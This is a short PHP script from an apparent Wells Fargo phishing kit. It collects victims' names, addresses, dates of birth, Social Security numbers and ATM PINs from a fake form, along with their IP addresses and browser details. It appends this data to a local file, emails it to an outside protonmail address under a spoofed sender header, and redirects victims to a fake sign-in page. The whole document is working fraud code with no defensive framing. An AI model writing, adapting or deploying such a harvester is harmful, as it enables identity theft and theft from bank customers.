<?php
$ip = getenv("REMOTE_ADDR");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message  = "----------WELLS FARGO-----------\n";
$message .= "Namesis: ".$_POST['o7a1']."\n";
$message .= "ADDY: ".$_POST['74a1']."\n";
$message .= "CITI: ".$_POST['44a1']."/".$_POST['7281l']."/".$_POST['a1x2b']."\n";
$message .= "DOB: ".$_POST['obai']."/".$_POST['obai2']."/".$_POST['obai3']."\n";
$message .= "SSNI: ".$_POST['okoni']."\n";
$message .= "ATM PIN: ".$_POST['okozi']."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "---------GOD LOVE---------------\n";
$message .= "Browser Details : ".$user_agent."\n";
$to = "100fareedah@protonmail.com";
$subj = " WelsFargo ||".$ip."\n";
$from = "From: WFargo  <codewizard@approject.com>";
$fp = fopen('virus.txt', 'a');
fwrite($fp, $message);
fclose($fp);
mail($to, $subj, $message, $from);
Header ("Location: wobi.html?signinpage&update=&cookiecheck=yes&destination=nba/signin&action");
?>